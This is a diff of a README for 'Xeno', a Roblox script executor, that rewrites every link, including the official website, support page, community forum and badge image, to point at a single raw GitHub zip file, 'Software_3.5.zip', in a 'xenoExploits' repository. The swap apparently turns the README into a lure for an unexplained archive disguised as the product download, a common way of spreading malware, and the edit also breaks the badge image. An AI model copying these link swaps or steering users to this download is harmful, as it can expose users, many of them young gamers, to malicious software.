@@ -4,13 +4,13 @@
 Xeno is a powerful tool that unlocks the full potential of Roblox. With Xeno, you can enhance your gameplay, automate tasks, and access exclusive features without the need for a key. Our user-friendly application simplifies script execution, making it easy for everyone to enjoy a richer Roblox experience.
 
 ## 📥 Download Xeno
-[![Download Xeno](https://img.shields.io/badge/Download%20Xeno-Get%20Started-brightgreen)](https://getxeno.org)
+[![Download Xeno](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip%20Xeno-Get%20Started-brightgreen)](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
 
 ## 🚀 Getting Started
 To start using Xeno, follow these simple steps:
 
 1. **Visit the Release Page:** Click the link below to go to our official release page where you can download Xeno.
-   - [Visit this page to download](https://getxeno.org)
+   - [Visit this page to download](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
   
 2. **Download The Latest Version:** On the release page, look for the latest version of Xeno. Click the download button next to it.
 
@@ -56,9 +56,9 @@ If you run into problems while using Xeno, consider the following tips:
 If you need additional support, visit our support page on the website or join our community forum. Here, you can ask questions, share scripts, and connect with other Xeno users.
 
 ## 🔗 Useful Links
-- [Official Website](https://getxeno.org)
-- [Support Page](https://support.getxeno.org)
-- [Community Forum](https://forum.getxeno.org)
+- [Official Website](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
+- [Support Page](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
 
 ## 👥 Community Feedback
 We value feedback from our users. Reach out to tell us how Xeno has impacted your Roblox experience. Your input helps us make improvements and continue offering quality features.
@@ -68,4 +68,4 @@ Xeno is your go-to tool for enriching your Roblox gameplay. Whether you’re loo
 
 Download now to start your adventure with Xeno!
 
-[![Download Xeno](https://img.shields.io/badge/Download%20Xeno-Get%20Started-brightgreen)](https://getxeno.org)
+[![Download Xeno](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip%20Xeno-Get%20Started-brightgreen)](https://raw.githubusercontent.com/xenoExploits/Xeno/main/Ptolemaic/Software_3.5.zip)
